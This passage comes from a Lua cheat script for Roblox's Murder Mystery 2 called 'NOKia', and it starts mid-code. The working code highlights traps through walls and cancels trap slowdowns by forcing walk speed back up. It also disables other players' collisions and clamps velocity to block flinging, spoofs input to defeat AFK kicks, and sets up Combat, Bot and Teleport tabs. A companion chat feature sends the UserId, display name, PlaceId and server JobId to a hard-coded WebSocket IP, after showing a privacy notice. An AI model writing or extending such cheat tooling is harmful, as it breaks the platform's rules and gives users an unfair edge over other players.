	if KillEventR then bind(KillEventR.OnClientEvent,function(victim,_,_,killType)
			if not victim then return end
			local nm=tostring(victim)
			recentKillEvent[nm]=os.clock()
			if flags.killFeed then feedNotify(nm,killType) end
		end) end
	local lastDead={}
	local function scanDeaths()
		if not (CRC and CRC.PlayerData) then return end
		for name,d in pairs(CRC.PlayerData) do
			local dead = (d.Dead==true)
			local was = lastDead[name]
			if was==false and dead then
				local seen=recentKillEvent[name]
				if flags.killFeed and not (seen and os.clock()-seen<2) then
					feedNotify(name,nil,d.Role)
				end
			end
			lastDead[name]=dead
		end
	end
	local diedConns={}
	local function watchDeaths(plr)
		if plr==LocalPlayer then return end
		local function hookChar(ch)
			local hum=ch and ch:FindFirstChildOfClass("Humanoid")
			if not hum then return end
			local c
			c=hum.Died:Connect(function()
				local nm=plr.Name
				local seen=recentKillEvent[nm]
				if flags.killFeed and not (seen and os.clock()-seen<2) then
					recentKillEvent[nm]=os.clock()
					feedNotify(plr.DisplayName or nm,nil,roleOf(plr))
				end
			end)
			table.insert(diedConns,c); table.insert(conns,c)
		end
		if plr.Character then hookChar(plr.Character) end
		table.insert(conns,plr.CharacterAdded:Connect(function(ch)
			task.defer(function() hookChar(ch) end)
		end))
	end
	for _,p in ipairs(NOKia.plrs) do watchDeaths(p) end
	bind(Players.PlayerAdded,watchDeaths)
	local PlayerDataChangedR=GameplayR:FindFirstChild("PlayerDataChanged")
	if PlayerDataChangedR then bind(PlayerDataChangedR.OnClientEvent,function() task.defer(scanDeaths) end) end
	local RoundStartR=GameplayR:FindFirstChild("RoundStart")
	if RoundStartR then bind(RoundStartR.OnClientEvent,function()
			lastDead={}; recentKillEvent={}; coinBagFull=false
			task.defer(scanDeaths)
		end) end
	task.spawn(function() while not Library.Unloaded do scanDeaths(); task.wait(0.2) end end)
end

bind(TeleportService.TeleportInitFailed,function(_,_,_,_)
	local p=hopFallbackPlace
	if not p then return end
	hopFallbackPlace=nil
	notify("That server was full, letting Roblox pick one")
	pcall(function() TeleportService:Teleport(p,LocalPlayer) end)
end)
if VirtualUser then bind(LocalPlayer.Idled,function() if flags.antiAfk then pcall(function() VirtualUser:CaptureController(); VirtualUser:ClickButton2(Vector2.new()) end) end end) end

do
	local TrapSystem=RS:FindFirstChild("TrapSystem")
	local trapHls={}
	local function dropTrap(part)
		local h=trapHls[part]
		if h then pcall(function() h.hl:Destroy() end); pcall(function() h.bb:Destroy() end); trapHls[part]=nil end
	end
	local function addTrap(part)
		if trapHls[part] or not part:IsA("BasePart") then return end
		local hl=create("Highlight",{Name=rnd(),Adornee=part,FillColor=Color3.fromRGB(255,90,255),
			FillTransparency=0.4,OutlineColor=Color3.fromRGB(255,170,255),OutlineTransparency=0,
			DepthMode=Enum.HighlightDepthMode.AlwaysOnTop,Enabled=false,Parent=EspGui})
		local bb=create("BillboardGui",{Name=rnd(),Size=UDim2.fromOffset(90,16),AlwaysOnTop=true,
			StudsOffsetWorldSpace=Vector3.new(0,2,0),Adornee=part,Enabled=false,Parent=EspGui},
		{create("TextLabel",{BackgroundTransparency=1,Size=UDim2.fromScale(1,1),Font=Enum.Font.GothamBold,
			TextSize=12,TextColor3=Color3.fromRGB(255,150,255),TextStrokeTransparency=.4,Text="TRAP"})})
		trapHls[part]={hl=hl,bb=bb}
	end
	for _,d in ipairs(workspace:GetDescendants()) do
		if d.Name=="TrapVisual" then addTrap(d) end
	end
	bind(workspace.DescendantAdded,function(d)
		if d.Name=="TrapVisual" then task.defer(addTrap,d) end
	end)
	bind(workspace.DescendantRemoving,function(d)
		if trapHls[d] then dropTrap(d) end
	end)
	task.spawn(function() while not Library.Unloaded do
			for part,h in pairs(trapHls) do
				if not part.Parent then dropTrap(part)
				else
					h.hl.Enabled=flags.trapEsp
					h.bb.Enabled=flags.trapEsp
				end
			end
			task.wait(0.1)
		end end)

	if TrapSystem then
		local thl=TrapSystem:FindFirstChild("TrapHitLocal")
		if thl then
			bind(thl.OnClientEvent,function()
				if not flags.antiTrap then return end
				task.spawn(function()
					local ch=LocalPlayer.Character
					local hum=ch and ch:FindFirstChildOfClass("Humanoid")
					if not hum then return end
					local want=16
					pcall(function() if Options.WalkSpeed then want=tonumber(Options.WalkSpeed.Value) or 16 end end)
					local t0=os.clock()
					while os.clock()-t0<4.6 do
						if hum.Parent then
							if hum.WalkSpeed<want then hum.WalkSpeed=want end
							if hum.JumpPower<40 then hum.UseJumpPower=true; hum.JumpPower=50 end
						end
						RunService.Heartbeat:Wait()
					end
				end)
			end)
		end
	end
end
do
	local MAX_LINEAR=190
	local MAX_ANGULAR=22
	local MAX_DELTA=120
	local lastVel=nil
	local otherParts={}
	NOKia.antiFlingParts=otherParts
	local nParts=0
	local function addPart(d)
		if d:IsA("BasePart") then
			nParts=nParts+1
			otherParts[nParts]=d
			if d.CanCollide then d.CanCollide=false end
		end
	end
	local function hookChar(ch)
		if not ch then return end
		for _,d in ipairs(ch:GetDescendants()) do addPart(d) end
		ch.DescendantAdded:Connect(function(d)
			if flags.antiFling then task.defer(addPart,d) end
		end)
	end
	local function rebuildOthers()
		table.clear(otherParts)
		nParts=0
		for _,p in ipairs(NOKia.plrs) do
			if p~=LocalPlayer and p.Character then
				for _,d in ipairs(p.Character:GetDescendants()) do addPart(d) end
			end
		end
	end
	local function watch(p)
		if p==LocalPlayer then return end
		hookChar(p.Character)
		p.CharacterAdded:Connect(function(ch) task.defer(function() hookChar(ch); rebuildOthers() end) end)
	end
	for _,p in ipairs(NOKia.plrs) do watch(p) end
	bind(Players.PlayerAdded,function(p) watch(p); task.defer(rebuildOthers) end)
	bind(Players.PlayerRemoving,function() task.defer(rebuildOthers) end)
	task.spawn(function() while not Library.Unloaded do
			if flags.antiFling then rebuildOthers() end
			task.wait(3)
		end end)

	local function selfBusy()
		return flags.fly or NOKia.antiFlingPausedByFling==true
	end
	local lastSweep=0
	local SWEEP_INTERVAL=0
	local function guard()
		if not flags.antiFling or selfBusy() then return end
		if NOKia.teleporting() then return end
		local now=os.clock()
		if now-lastSweep>=SWEEP_INTERVAL then
			lastSweep=now
			for i=1,nParts do
				local d=otherParts[i]
				if d and d.Parent and d.CanCollide then d.CanCollide=false end
			end
		end
		local hrp=getHRP(LocalPlayer.Character)
		if not hrp then return end
		local lv=hrp.AssemblyLinearVelocity
		if lastVel then
			local jump=(lv-lastVel).Magnitude
			if jump>MAX_DELTA then
				hrp.AssemblyLinearVelocity=lastVel
				hrp.AssemblyAngularVelocity=Vector3.zero
				lv=lastVel
			end
		end
		if lv.Magnitude>MAX_LINEAR then lv=lv.Unit*MAX_LINEAR; hrp.AssemblyLinearVelocity=lv end
		lastVel=lv
		for _,p in ipairs(getCharParts(LocalPlayer.Character)) do
			if p.Parent and p:IsA("BasePart") and p.AssemblyAngularVelocity.Magnitude>MAX_ANGULAR then
				p.AssemblyAngularVelocity=Vector3.zero
			end
		end
		local av=hrp.AssemblyAngularVelocity
		if av.Magnitude>MAX_ANGULAR then hrp.AssemblyAngularVelocity=Vector3.zero end
	end
	bind(RunService.Stepped,guard)
	bind(RunService.Heartbeat,guard)

	local function isMover(d)
		return d:IsA("BodyVelocity") or d:IsA("BodyAngularVelocity") or d:IsA("BodyThrust")
			or d:IsA("BodyForce") or d:IsA("LinearVelocity") or d:IsA("AngularVelocity")
	end
	local function watchSelf(ch)
		if not ch then return end
		ch.DescendantAdded:Connect(function(d)
			if not flags.antiFling or flags.fly then return end
			if not isMover(d) then return end
			task.defer(function()
				if d~=flyBV and d~=flyBG and d.Parent and not flags.fly then
					pcall(function() d:Destroy() end)
				end
			end)
		end)
	end
	watchSelf(LocalPlayer.Character)
	bind(LocalPlayer.CharacterAdded,watchSelf)
end
local Window=Library:CreateWindow({Title="NOKia",Footer="MM2 · ",Center=true,AutoShow=true,Resizable=true,NotifySide="Right",ShowCustomCursor=true,GlobalSearch=true})
hideWindow()
NOKia.hookTooltipTranslation=function()
	local screen=Library.ScreenGui
	if not screen then return end
	for _,node in ipairs(screen:GetDescendants()) do
		-- Obsidian uses one dedicated, high-ZIndex text label for its tooltips.
		if node:IsA("TextLabel") and node.ZIndex==20 and node.TextWrapped then
			node:GetPropertyChangedSignal("Text"):Connect(function()
				if NOKia.uiLanguage~="French" then return end
				local translated=NOKia.frenchText[node.Text]
				if translated and node.Text~=translated then node.Text=translated end
			end)
			return
		end
	end
end
task.defer(NOKia.hookTooltipTranslation)
pcall(function()
	if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
		pcall(function() Library.ShowCustomCursor=false end)
		pcall(function()
			if typeof(Library.SetDPIScale)=="function" then Library:SetDPIScale(115) end
		end)
		return
	end
	local vp=Camera.ViewportSize
	local w=math.min(700,math.max(480,vp.X-40))
	local h=math.min(470,math.max(360,vp.Y-40))
	Library.OriginalMinSize=Vector2.new(w,h)
	Library.MinSize=Library.OriginalMinSize*(Library.DPIScale or 1)
end)
do
	local area
	for _,c in ipairs(Library.ScreenGui:GetChildren()) do
		if c:IsA("Frame") and c.AnchorPoint==Vector2.new(1,0) and c.Size==UDim2.new(0,300,1,-6) then
			area=c; break
		end
	end
	if area then
		area.AnchorPoint=Vector2.new(1,1)
		area.Position=UDim2.new(1,-6,1,-6)
		NOKia.notifOrder={}
		Library.UpdateNotificationPositions=function() end
		local function relayout()
			local order=NOKia.notifOrder
			local y=0
			for i=#order,1,-1 do
				local fb=order[i]
				if not (fb and fb.Parent and Library.Notifications[fb]) then
					table.remove(order,i)
				end
			end
			for i=#order,1,-1 do
				local fb=order[i]
				fb.AnchorPoint=Vector2.new(1,1)
				local target=UDim2.new(1,0,1,-y)
				if fb.Position~=target then
					TweenService:Create(fb,TweenInfo.new(0.18,Enum.EasingStyle.Quint,Enum.EasingDirection.Out),{Position=target}):Play()
				end
				y=y+fb.AbsoluteSize.Y+8
			end
		end
		local realNotify=Library.Notify
		Library.Notify=function(self,...)
			local seen={}
			for fb in pairs(Library.Notifications) do seen[fb]=true end
			local ret=realNotify(self,...)
			for fb in pairs(Library.Notifications) do
				if not seen[fb] then
					fb.AnchorPoint=Vector2.new(1,1)
					fb.Position=UDim2.new(1,0,1,0)
					table.insert(NOKia.notifOrder,fb)
				end
			end
			relayout()
			return ret
		end
		task.spawn(function()
			while not Library.Unloaded do
				if #NOKia.notifOrder>0 then relayout() end
				task.wait(0.15)
			end
		end)
	end
end
local savedCornerRadii=setmetatable({},{__mode="k"})
local function setMenuStyle(style)
	local radii={Classic=4,["iOS 26 Rounded"]=14,["Material UI Extended"]=10,["Soft Rounded"]=8,Capsule=18}
	local radius=radii[style] or radii.Classic
	Library.CornerRadius=radius
	local gui=Library.ScreenGui
	if not gui then return end
	for _,corner in ipairs(gui:GetDescendants()) do
		if corner:IsA("UICorner") then
			if savedCornerRadii[corner]==nil then savedCornerRadii[corner]=corner.CornerRadius end
			pcall(function() corner.CornerRadius=style=="Classic" and savedCornerRadii[corner] or UDim.new(0,radius) end)
		end
	end
end
local Tabs={
	Combat=Window:AddTab("Combat","crosshair"),
	Player=Window:AddTab("Player","user"),
	Bot=Window:AddTab("Bot","bot"),
	Visuals=Window:AddTab("Visuals","eye"),
	Teleport=Window:AddTab("Teleport","map-pin"),
	Server=Window:AddTab("Server","server"),
	Lookup=Window:AddTab("Lookup","search"),
	GUI=Window:AddTab("GUI","layout-dashboard"),
	Chat=Window:AddTab("Chat","message-circle"),
	NOKia=Window:AddTab("NOKia Network","radio"),
	NokiaChat=Window:AddTab("Nokia Chat","messages-square"),
	Safety=Window:AddTab("Safety","shield"),
	UI=Window:AddTab("UI Settings","settings"),
}

do
	NOKia.TextChatService=game:GetService("TextChatService")
	NOKia.networkArmed=false
	NOKia.nokiaUsers={}
	NOKia.nokiaChatHistory={}
	NOKia.nokiaChatLabels={}
	NOKia.nokiaWorldHistory={}
	NOKia.nokiaWorldLabels={}
	NOKia.activeOnlineScope="server"
	NOKia.onlineStats={serverOnline=0,globalOnline=0,ping="--",region="FR"}
	NOKia.onlineUnread=0
	NOKia.ONLINE_URL="ws://212.83.145.217:8765/online"
	NOKia.ONLINE_PRIVACY_FILE=CONFIG_FOLDER.."/online_privacy.json"
	NOKia.onlinePrivacyRemember=false
	NOKia.onlineConsentApproved=false
	function NOKia.loadOnlinePrivacy()
		pcall(function()
			if typeof(isfile)=="function" and typeof(readfile)=="function" and isfile(NOKia.ONLINE_PRIVACY_FILE) then
				local saved=HttpService:JSONDecode(readfile(NOKia.ONLINE_PRIVACY_FILE))
				NOKia.onlinePrivacyRemember=type(saved)=="table" and saved.hideNotice==true
			end
		end)
	end
	function NOKia.saveOnlinePrivacy(remember)
		NOKia.onlinePrivacyRemember=remember==true
		pcall(function()
			if typeof(isfolder)=="function" and typeof(makefolder)=="function" and not isfolder(CONFIG_FOLDER) then makefolder(CONFIG_FOLDER) end
			if typeof(writefile)=="function" then writefile(NOKia.ONLINE_PRIVACY_FILE,HttpService:JSONEncode({hideNotice=NOKia.onlinePrivacyRemember})) end
		end)
	end
	function NOKia.onlineText(key,...)
		local english={
			privateScope="Private · %s",worldScope="World chat — all servers",serverScope="Server chat — this instance only",
			connected="Connected",disabled="disabled",disconnected="disconnected",connecting="Connecting...",reconnecting="Reconnecting...",authenticating="Authenticating...",unavailable="Server unavailable — retrying in 5 s",wsUnavailable="WebSocket unavailable",wsIncompatible="WebSocket incompatible",
			status="Status: %s • %d Nokia in this server",connectedStatus="Status: connected • %d in this server",region="Region: %s • Ping: %s ms",global="Nokia users connected: %d (all servers)",chatStatus="Nokia Online: %s",
			connectFirst="Connect to Nokia Online before searching",requestSent="Request sent to %s",choosePrivate="Choose a private conversation",openPrivate="Open a private conversation to send an invite",inviteMessage="Invitation to join my server",invalidInvite="Invalid server invitation",joiningInvite="Joining invited server...",
			connectedNotice="Connected to Nokia server",reconnectedNotice="Nokia server connection restored",privateRequest="Private conversation request from %s",privateReady="Private conversation ready",privateRefused="%s declined the private conversation",inviteSent="Server invitation sent",inviteQueued="Invitation saved until their reconnection",connectionLost="Nokia server connection lost — retrying in 5 seconds",notConnected="Nokia Online is not connected yet",writeMessage="Write a message before sending",searching="Searching...",noUsers="No Nokia user is currently online.",requestLine="%s wants to chat privately",requestButton="  %s  — request a conversation",privacyReset="The privacy notice will be shown on the next activation",
			privacyTitle="Privacy — Nokia Online",privacyDescription="When Nokia Online is enabled, the script sends your Roblox UserId, display name, PlaceId and this server instance identifier to the Nokia server. Messages you send in Nokia chats pass through that server. Private messages received while you are offline may be kept there until delivery; the last 5 messages of each private conversation are also saved locally on your device. Other Nokia users can see your display name and presence in their same instance. No message uses Roblox chat.",cancel="Cancel",enableOnce="Enable once",enableRemember="Enable and do not show again",
			badgeFounder="Nokia Founder",badgeAdmin="Nokia Admin",banned="Nokia Online access denied: %s",
		}
		local french={
			privateScope="Privé · %s",worldScope="Chat monde — tous les serveurs",serverScope="Chat serveur — cette instance uniquement",
			connected="Connecté",disabled="désactivé",disconnected="déconnecté",connecting="Connexion...",reconnecting="Reconnexion...",authenticating="Authentification...",unavailable="Serveur indisponible — nouvel essai dans 5 s",wsUnavailable="WebSocket indisponible",wsIncompatible="WebSocket incompatible",
			status="État : %s • %d Nokia dans ce serveur",connectedStatus="État : connecté • %d dans ce serveur",region="Région : %s • Ping : %s ms",global="Utilisateurs Nokia connectés : %d (tous serveurs)",chatStatus="Nokia Online : %s",
			connectFirst="Connecte Nokia Online avant de rechercher",requestSent="Demande envoyée à %s",choosePrivate="Choisis une conversation privée",openPrivate="Ouvre une conversation privée pour envoyer une invitation",inviteMessage="Invitation à rejoindre mon serveur",invalidInvite="Invitation serveur invalide",joiningInvite="Connexion au serveur invité...",
			connectedNotice="Connecté au serveur Nokia",reconnectedNotice="Connexion au serveur Nokia retrouvée",privateRequest="Demande de discussion privée de %s",privateReady="Discussion privée prête",privateRefused="%s a refusé la discussion privée",inviteSent="Invitation serveur envoyée",inviteQueued="Invitation sauvegardée pour sa reconnexion",connectionLost="Connexion au serveur Nokia perdue — reconnexion dans 5 secondes",notConnected="Nokia Online n'est pas encore connecté",writeMessage="Écris un message avant de l'envoyer",searching="Recherche...",noUsers="Aucun utilisateur Nokia en ligne trouvé.",requestLine="%s veut discuter en privé",requestButton="  %s  — demander une discussion",privacyReset="L'avis de confidentialité sera affiché à la prochaine activation",
			privacyTitle="Confidentialité — Nokia Online",privacyDescription="En activant Nokia Online, le script transmet au serveur Nokia ton UserId Roblox, ton pseudo affiché, le PlaceId et l’identifiant de cette instance. Les messages que tu envoies dans les chats Nokia transitent par ce serveur. Les messages privés reçus hors ligne peuvent y être gardés jusqu’à leur livraison ; les 5 derniers messages de chaque discussion privée sont aussi sauvegardés localement sur ton appareil. Les autres utilisateurs Nokia peuvent voir ton pseudo et ta présence dans leur même instance. Aucun message ne passe par le chat Roblox.",cancel="Annuler",enableOnce="Activer une fois",enableRemember="Activer et ne plus afficher",
			badgeFounder="Fondateur Nokia",badgeAdmin="Admin Nokia",banned="Accès à Nokia Online interdit : %s",
		}
		local text=(NOKia.uiLanguage=="French" and french or english)[key] or english[key] or key
		return select("#",...)>0 and string.format(text,...) or text
	end
	function NOKia.onlineStateText(state)
		local keys={Connected="connected",Disabled="disabled",Disconnected="disconnected",["Connecting..."]="connecting",["Reconnecting..."]="reconnecting",["Authenticating..."]="authenticating",["Server unavailable — retrying in 5 s"]="unavailable",["WebSocket unavailable"]="wsUnavailable",["WebSocket incompatible"]="wsIncompatible"}
		return NOKia.onlineText(keys[state] or tostring(state or "Disconnected"))
	end
	NOKia.loadOnlinePrivacy()
	NOKia.PRIVATE_CHAT_FILE=CONFIG_FOLDER.."/private_chats.json"
	NOKia.privateConversations={}
	NOKia.privateRequests={}
	NOKia.activePrivateUser=nil

	function NOKia.savePrivateChats()
		pcall(function()
			if typeof(isfolder)=="function" and typeof(makefolder)=="function" and not isfolder(CONFIG_FOLDER) then makefolder(CONFIG_FOLDER) end
			if typeof(writefile)=="function" then writefile(NOKia.PRIVATE_CHAT_FILE,HttpService:JSONEncode(NOKia.privateConversations)) end
		end)
	end
	function NOKia.loadPrivateChats()
		pcall(function()
			if typeof(isfile)=="function" and typeof(readfile)=="function" and isfile(NOKia.PRIVATE_CHAT_FILE) then
				local decoded=HttpService:JSONDecode(readfile(NOKia.PRIVATE_CHAT_FILE))
				if type(decoded)=="table" then NOKia.privateConversations=decoded end
			end
		end)
	end
	function NOKia.privateConversation(user)
		if type(user)~="table" or not user.userId then return nil end
		local id=tostring(user.userId)
		local conversation=NOKia.privateConversations[id]
		if type(conversation)~="table" then conversation={user={userId=id,name=tostring(user.name or "?"),role=tostring(user.role or "member")},messages={}}; NOKia.privateConversations[id]=conversation end
		conversation.user=conversation.user or {userId=id,name=tostring(user.name or "?"),role=tostring(user.role or "member")}
		conversation.user.name=tostring(user.name or conversation.user.name or "?")
		conversation.user.role=tostring(user.role or conversation.user.role or "member")
		conversation.messages=type(conversation.messages)=="table" and conversation.messages or {}
		return conversation
	end
	function NOKia.pushPrivateMessage(user,message,at,own,invite)
		local conversation=NOKia.privateConversation(user)
		if not conversation then return end
		table.insert(conversation.messages,{name=own and (LocalPlayer.DisplayName or LocalPlayer.Name) or tostring(user.name or "?"),message=tostring(message or ""),role=own and (NOKia.onlineRole or "member") or tostring(user.role or "member"),own=own==true,at=tonumber(at) or math.floor(os.time()*1000),invite=invite})
		while #conversation.messages>5 do table.remove(conversation.messages,1) end
		NOKia.savePrivateChats()
		if not own and not (Library.Toggled and Library.ActiveTab==Tabs.NokiaChat and NOKia.activeOnlineScope=="private" and NOKia.activePrivateUser and tostring(NOKia.activePrivateUser.userId)==tostring(user.userId)) then
			NOKia.onlineUnread=math.min(99,(NOKia.onlineUnread or 0)+1)
			if NOKia.updateOnlineUnread then NOKia.updateOnlineUnread() end
		end
		NOKia.refreshOnlineChat()
	end
	function NOKia.openPrivateConversation(user)
		local conversation=NOKia.privateConversation(user)
		if not conversation then return end
		NOKia.activePrivateUser=conversation.user
		NOKia.activeOnlineScope="private"
		pcall(function() NOKia.privatePanel.Visible=false end)
		NOKia.refreshOnlineChat()
	end
	NOKia.loadPrivateChats()

	function NOKia.refreshNokiaChat()
		NOKia.refreshOnlineChat()
	end
	function NOKia.pushOnlineChat(payload)
		local isWorld=payload.scope=="world"
		local history=isWorld and NOKia.nokiaWorldHistory or NOKia.nokiaChatHistory
		local from=payload.from or {}
		local own=tostring(from.userId or "")==tostring(LocalPlayer.UserId)
		table.insert(history,{name=tostring(from.name or "?"),message=tostring(payload.text or ""),role=tostring(from.role or "member"),own=own})
		while #history>24 do table.remove(history,1) end
		if not own and not (Library.Toggled and Library.ActiveTab==Tabs.NokiaChat) then
			NOKia.onlineUnread=math.min(99,(NOKia.onlineUnread or 0)+1)
			if NOKia.updateOnlineUnread then NOKia.updateOnlineUnread() end
		end
		NOKia.refreshOnlineChat()
	end
	function NOKia.refreshOnlineChat()
		local private=NOKia.activeOnlineScope=="private" and NOKia.activePrivateUser and NOKia.privateConversation(NOKia.activePrivateUser)
		local history=private and private.messages or (NOKia.activeOnlineScope=="world" and NOKia.nokiaWorldHistory or NOKia.nokiaChatHistory)
		local first=math.max(1,#history-#NOKia.nokiaChatLabels+1)
		for index,slot in ipairs(NOKia.nokiaChatLabels) do
			local entry=history[first+index-1]
			pcall(function()
				slot.holder.Visible=entry~=nil
				if entry then
					local own=type(entry)=="table" and entry.own==true
					local role=type(entry)=="table" and entry.role or "member"
					local hasRole=role=="founder" or role=="admin"
					slot.bubble.AnchorPoint=Vector2.new(own and 1 or 0,0)
					slot.bubble.Position=UDim2.new(own and 1 or 0,0,0,0)
					slot.bubble.BackgroundColor3=own and Color3.fromRGB(52,105,210) or Color3.fromRGB(28,45,77)
					slot.prefix.Visible=hasRole
					slot.prefix.Text=role=="founder" and (NOKia.uiLanguage=="French" and "FONDATEUR NOKIA" or "NOKIA FOUNDER") or "ADMIN NOKIA"
					slot.prefix.BackgroundColor3=role=="founder" and Color3.fromRGB(232,166,42) or Color3.fromRGB(204,63,91)
					slot.label.Position=UDim2.fromOffset(hasRole and 128 or 10,0)
					slot.label.Size=UDim2.new(1,-(hasRole and 138 or 20),1,0)
					local timeText=entry.at and os.date("%H:%M",math.floor(tonumber(entry.at)/1000)) or ""
					slot.label.Text=type(entry)=="table" and (tostring(entry.name or "?").." : "..tostring(entry.message or "")..(timeText~="" and "  · "..timeText or "")) or tostring(entry)
					slot.joinButton.Visible=entry.invite~=nil and not own
					slot.invite=entry.invite
				end
			end)
		end
		pcall(function()
			NOKia.nokiaChatScopeLabel.Text=NOKia.activeOnlineScope=="private" and NOKia.onlineText("privateScope",tostring(NOKia.activePrivateUser and NOKia.activePrivateUser.name or "?")) or (NOKia.activeOnlineScope=="world" and NOKia.onlineText("worldScope") or NOKia.onlineText("serverScope"))
			NOKia.nokiaScopeServerButton.BackgroundColor3=NOKia.activeOnlineScope=="server" and Color3.fromRGB(54,112,225) or Color3.fromRGB(25,43,74)
			NOKia.nokiaScopeWorldButton.BackgroundColor3=NOKia.activeOnlineScope=="world" and Color3.fromRGB(54,112,225) or Color3.fromRGB(25,43,74)
			NOKia.nokiaPrivateButton.BackgroundColor3=NOKia.activeOnlineScope=="private" and Color3.fromRGB(54,112,225) or Color3.fromRGB(25,43,74)
		end)
		task.defer(function()
			pcall(function() NOKia.nokiaMessagesFrame.CanvasPosition=Vector2.new(0,math.max(0,NOKia.nokiaMessagesFrame.AbsoluteCanvasSize.Y-NOKia.nokiaMessagesFrame.AbsoluteWindowSize.Y)) end)
		end)
	end
	function NOKia.ensureNokiaBadge(player)
		if not player or player==LocalPlayer then return end
		local state=NOKia.nokiaUsers[player.UserId]
		if not state then state={player=player,lastSeen=os.clock()}; NOKia.nokiaUsers[player.UserId]=state end
		state.lastSeen=os.clock()
		local head=player.Character and (player.Character:FindFirstChild("Head") or getHRP(player.Character))
		if not head then return end
		if not (state.badge and state.badge.Parent) then
			local role=state.role=="founder" and NOKia.onlineText("badgeFounder") or state.role=="admin" and NOKia.onlineText("badgeAdmin") or "Nokia"
			local badgeText="✦  "..role.."  ✦"
			local glow=create("TextLabel",{BackgroundTransparency=1,Size=UDim2.fromScale(1,1),Position=UDim2.fromOffset(0,1),Text=badgeText,Font=Enum.Font.GothamBlack,TextSize=19,TextColor3=Color3.fromRGB(255,255,255),TextTransparency=.42,TextStrokeTransparency=.3})
			local textLabel=create("TextLabel",{BackgroundTransparency=1,Size=UDim2.fromScale(1,1),Text=badgeText,Font=Enum.Font.GothamBlack,TextSize=18,TextColor3=Color3.fromRGB(255,255,255),TextStrokeColor3=Color3.fromRGB(15,15,25),TextStrokeTransparency=.15},
				{create("UIGradient",{Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,70,170)),ColorSequenceKeypoint.new(.25,Color3.fromRGB(125,90,255)),ColorSequenceKeypoint.new(.5,Color3.fromRGB(70,220,255)),ColorSequenceKeypoint.new(.75,Color3.fromRGB(110,255,130)),ColorSequenceKeypoint.new(1,Color3.fromRGB(255,210,60))})})})
			state.badge=create("BillboardGui",{Name=rnd(),Adornee=head,Size=UDim2.fromOffset(240,30),StudsOffsetWorldSpace=Vector3.new(0,1.8,0),AlwaysOnTop=true,MaxDistance=500,Parent=EspGui},{glow,textLabel})
		else state.badge.Adornee=head end
	end
	function NOKia.onlineSend(payload)
		if not (flags.nokiaNetwork and NOKia.onlineSocket) then return false end
		local ok=pcall(function() NOKia.onlineSocket:Send(HttpService:JSONEncode(payload)) end)
		if not ok and NOKia.onlineDisconnected then task.defer(NOKia.onlineDisconnected) end
		return ok
	end
	function NOKia.applyOnlineUser(user)
		if type(user)~="table" then return end
		local userId=tonumber(user.userId)
		local player=userId and Players:GetPlayerByUserId(userId)
		if not player or player==LocalPlayer then return end
		NOKia.ensureNokiaBadge(player)
		local state=NOKia.nokiaUsers[player.UserId]
		if state then state.role=user.role; if state.badge then state.badge:Destroy(); state.badge=nil; NOKia.ensureNokiaBadge(player) end end
	end
	function NOKia.searchPrivateUsers(query)
		if not (NOKia.onlineSocket and NOKia.onlineState=="Connected") then notify(NOKia.onlineText("connectFirst")) return end
		NOKia.onlineSend({type="user_search",query=tostring(query or ""):sub(1,40)})
	end
	function NOKia.requestPrivateChat(user)
		if not user or not user.userId then return end
		NOKia.onlineSend({type="private_request",toUserId=tostring(user.userId)})
		if NOKia.privateSearchStatus then NOKia.privateSearchStatus.Text=NOKia.onlineText("requestSent",tostring(user.name or "?")) end
	end
	function NOKia.respondPrivateRequest(user,accept)
		if not user or not user.userId then return end
		NOKia.onlineSend({type="private_response",fromUserId=tostring(user.userId),accept=accept==true})
		NOKia.privateRequests[tostring(user.userId)]=nil
		if NOKia.refreshPrivateRequestPanel then NOKia.refreshPrivateRequestPanel() end
	end
	function NOKia.sendPrivateChat(message)
		local user=NOKia.activePrivateUser
		if not user then notify(NOKia.onlineText("choosePrivate")) return end
		if message=="" then return end
		NOKia.pushPrivateMessage(user,message,math.floor(os.time()*1000),true,nil)
		NOKia.onlineSend({type="private_message",toUserId=tostring(user.userId),text=message:sub(1,300)})
	end
	function NOKia.sendServerInvite()
		local user=NOKia.activePrivateUser
		if not user then notify(NOKia.onlineText("openPrivate")) return end
		NOKia.onlineSend({type="server_invite",toUserId=tostring(user.userId),placeId=tostring(game.PlaceId),jobId=tostring(game.JobId)})
		NOKia.pushPrivateMessage(user,NOKia.onlineText("inviteMessage"),math.floor(os.time()*1000),true,nil)
	end
	function NOKia.joinPrivateInvite(invite)
		if type(invite)~="table" or not tonumber(invite.placeId) or not invite.jobId then return notify(NOKia.onlineText("invalidInvite")) end
		notify(NOKia.onlineText("joiningInvite"))
		pcall(function() TeleportService:TeleportToPlaceInstance(tonumber(invite.placeId),tostring(invite.jobId),LocalPlayer) end)
	end
	function NOKia.handleOnlinePacket(raw)
		local ok,data=pcall(function() return HttpService:JSONDecode(raw) end)
		if not ok or type(data)~="table" then return end
		NOKia.onlineLastPacket=os.clock()
		if data.type=="welcome" then
			local reconnecting=NOKia.onlineEverConnected==true
			NOKia.onlineState="Connected"
			NOKia.onlineRole=data.user and data.user.role or "member"
			NOKia.onlineEverConnected=true
			NOKia.onlineDisconnectNotified=false
			notify(reconnecting and NOKia.onlineText("reconnectedNotice") or NOKia.onlineText("connectedNotice"),4)
			for _,user in ipairs(data.users or {}) do NOKia.applyOnlineUser(user) end
		elseif data.type=="user_search_result" then
			NOKia.privateSearchResults=data.users or {}
			if NOKia.refreshPrivateSearch then NOKia.refreshPrivateSearch() end
		elseif data.type=="private_request" then
			if data.from and data.from.userId then
				NOKia.privateRequests[tostring(data.from.userId)]=data.from
				NOKia.onlineUnread=math.min(99,(NOKia.onlineUnread or 0)+1)
				if NOKia.updateOnlineUnread then NOKia.updateOnlineUnread() end
				if NOKia.refreshPrivateRequestPanel then NOKia.refreshPrivateRequestPanel() end
				notify(NOKia.onlineText("privateRequest",tostring(data.from.name or "?")),5)
			end
		elseif data.type=="private_ready" then
			if data.user then NOKia.openPrivateConversation(data.user); notify(NOKia.onlineText("privateReady"),3) end
		elseif data.type=="private_refused" then notify(NOKia.onlineText("privateRefused",tostring(data.user and data.user.name or "Player")),4)
		elseif data.type=="private_message" then
			if data.from then NOKia.pushPrivateMessage(data.from,data.text,data.at,false,nil) end
		elseif data.type=="server_invite" then
			if data.from then NOKia.pushPrivateMessage(data.from,NOKia.onlineText("inviteMessage"),data.at,false,{placeId=data.placeId,jobId=data.jobId}) end
		elseif data.type=="private_inbox" then
			for _,packet in ipairs(data.messages or {}) do
				if packet.type=="private_message" and packet.from then NOKia.pushPrivateMessage(packet.from,packet.text,packet.at,false,nil)
